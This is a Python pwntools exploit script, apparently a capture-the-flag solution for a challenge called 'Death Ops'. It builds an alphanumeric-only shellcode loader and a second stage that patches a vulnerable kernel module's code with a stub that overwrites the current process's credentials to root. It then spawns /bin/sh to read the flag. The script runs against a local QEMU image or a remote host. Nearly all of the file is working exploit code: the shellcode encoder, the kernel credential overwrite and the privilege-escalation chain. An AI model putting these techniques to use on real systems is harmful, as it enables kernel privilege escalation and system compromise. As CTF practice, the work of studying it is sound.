#!/usr/bin/env python3
"""Death Ops — alphanumeric loader + module-text current-cred LPE."""
from pwn import *
import re
import sys

context.arch = "amd64"
context.log_level = "info"

WS = "/home/y_rose/ctf/pwnsec_2026/Pwn/Death_Ops/agent_workspace"
ALNUM = bytes(list(range(0x30, 0x3A)) + list(range(0x41, 0x5B)) + list(range(0x61, 0x7B)))
ALNUM_SET = set(ALNUM)

KSTUB = asm(
    """
    mov rax, gs:[0x14b40]
    mov rcx, qword ptr [rax+0x608]
    xor edi, edi
    mov dword ptr [rcx+0x04], edi
    mov dword ptr [rcx+0x1c], edi
    and dword ptr [rax], 0xfffffeff
    ret
    """
).ljust(32, b"\x90")
BYPASS = u64(bytes.fromhex("31c0909090909090"))


def qemu_cmd(initrd):
    return [
        "qemu-system-x86_64",
        "-m",
        "256M",
        "-kernel",
        f"{WS}/qemu/bzImage",
        "-initrd",
        initrd,
        "-append",
        "console=ttyS0 oops=panic panic=1 kaslr pti=on quiet",
        "-nographic",
        "-no-reboot",
        "-monitor",
        "none",
        "-serial",
        "stdio",
        "-net",
        "none",
    ]


def recipes(m=0x41, disp=0x41):
    assert disp in ALNUM_SET
    tbl = {}
    for t in range(256):
        for imm in ALNUM:
            if (m * imm) & 0xFF == t:
                tbl[t] = bytes([0x6B, 0x41, disp, imm])
                break
        if t in tbl:
            continue
        for imm in ALNUM:
            for x in ALNUM:
                if ((m * imm) ^ x) & 0xFF == t:
                    tbl[t] = bytes([0x6B, 0x41, disp, imm, 0x34, x])
                    break
            if t in tbl:
                break
    return tbl


def alnum_loader():
    """A-Za-z0-9 payload: plant `mov rsi,rcx; syscall; jmp rsi` and fall through.

    rdi is zeroed with `imul edi, [rcx+0x70], 0x30` while that slot is still
    a memset-zero (payload is shorter than 0x70).
    """
    stub = bytes.fromhex("4889ce0f05ffe6")  # mov rsi, rcx; syscall; jmp rsi
    stub_off = 0x50
    const_off = 0x48  # in the fall-through pad, value 'A'
    tbl = recipes(0x41, const_off)
    assert all((stub_off + i) in ALNUM_SET for i in range(len(stub)))

    setup = b"PY"  # rcx = rwx
    setup += b"jAZ"  # rdx = 0x41
    setup += b"j0X40"  # eax = 0
    setup += b"kyz0"  # edi = [rcx+0x7a] * 0x30 == 0 (beyond 96-byte payload)

    body = b""
    for i, b in enumerate(stub):
        body += tbl[b]
        body += bytes([0x30, 0x41, stub_off + i])

    # imul planting clobbers eax; restore eax=0 before the planted syscall
    head = setup + body + b"j0X40"
    pad = bytearray()
    pos = len(head)
    while pos < stub_off:
        pad.append(0x41 if pos == const_off else 0x50)
        pos += 1
    payload = bytearray(head + bytes(pad))
    if len(payload) < const_off + 1:
        payload.extend(b"P" * (const_off + 1 - len(payload)))
        payload[const_off] = 0x41
    else:
        payload[const_off] = 0x41
    payload = payload.ljust(96, b"P")
    payload[const_off] = 0x41
    assert len(payload) == 96
    assert all(c in ALNUM_SET for c in payload), [hex(c) for c in payload if c not in ALNUM_SET]
    print("alnum loader", len(head), "total", len(payload), payload.decode("ascii"))
    return bytes(payload)


def stage2_continue_then_lpe(text):
    """First 0x41 bytes read more, then plant stub + trigger + execve."""
    stub_off = 0x00
    pairs = [(text + 0x3B, BYPASS)]
    for i in range(0, len(KSTUB), 8):
        pairs.append((text + stub_off + i, u64(KSTUB[i : i + 8])))
    rel = (text + stub_off - (text + 0x30 + 5)) & 0xFFFFFFFF
    jmp_val = u64(bytes([0xE9]) + p32(rel) + b"\x90\x90\x90")
    pairs.append((text + 0x30, jmp_val))
    table = b"".join(p64(a) + p64(v) for a, v in pairs)

    # chunk1 must be exactly the bytes overwritten by the 0x41-byte read,
    # and must pull the rest of this blob into rwx+0x41.
    chunk1 = asm(
        """
        lea r12, [rip]
        and r12, 0xfffffffffffff000
        lea rsi, [r12+0x41]
        xor eax, eax
        xor edi, edi
        mov edx, 0x400
        syscall
        jmp rsi
        """
    )
    print("chunk1", len(chunk1))
    assert len(chunk1) <= 0x41, len(chunk1)
    chunk1 = chunk1.ljust(0x41, b"\x90")

    rest = asm(
        f"""
        lea rbx, [rip+table]
        mov r15d, {len(pairs)}
    loop:
        mov rax, qword ptr [rbx]
        mov qword ptr [r12], rax
        mov rax, qword ptr [rbx+8]
        mov qword ptr [r12+8], rax
        mov eax, 1
        mov edi, 3
        mov rsi, r12
        mov edx, 16
        syscall
        add rbx, 16
        dec r15
        jnz loop
        mov eax, 1
        mov edi, 3
        mov rsi, r12
        mov edx, 16
        syscall
        lea rdi, [rip+sh]
        push 0
        lea rax, [rip+cmd]
        push rax
        lea rax, [rip+dashc]
        push rax
        push rdi
        mov rsi, rsp
        xor edx, edx
        mov eax, 59
        syscall
        mov eax, 60
        xor edi, edi
        syscall
        sh:
        .asciz "/bin/sh"
        dashc:
        .asciz "-c"
        cmd:
        .asciz "cat /flag*"
        table:
        """
    )
    blob = chunk1 + rest + table
    print("stage2", len(blob), "pairs", len(pairs))
    return blob


def exploit(io):
    io.recvuntil(b"CMD> ", timeout=90)
    io.send(b"1\n")
    io.recvuntil(b"TARGET> ")
    io.send(b"/sys/module/shadowops/sections/.text\n")
    data = io.recvuntil(b"CMD> ", timeout=10)
    text = int(re.search(br"0x[0-9a-f]+", data).group(), 16)
    log.info("module .text %s", hex(text))

    loader = alnum_loader()
    s2 = stage2_continue_then_lpe(text)
    io.send(b"2\n")
    io.recvuntil(b"PAYLOAD> ")
    io.send(loader)
    sleep(0.15)
    io.send(s2)
    out = io.recvrepeat(6)
    return out


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote(sys.argv[2], int(sys.argv[3]))
    else:
        initrd = f"{WS}/qemu/rootfs.cpio.gz"
        if len(sys.argv) > 1 and sys.argv[1] == "patched":
            initrd = f"{WS}/qemu/rootfs.patched.cpio.gz"
        io = process(qemu_cmd(initrd))
    try:
        out = exploit(io)
    finally:
        io.kill()
    sys.stdout.buffer.write(out)
    m = re.search(br"flag\{[^}]+\}", out)
    if m:
        print("\nFLAG", m.group().decode(), file=sys.stderr)
        return 0
    print("\nNO FLAG", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
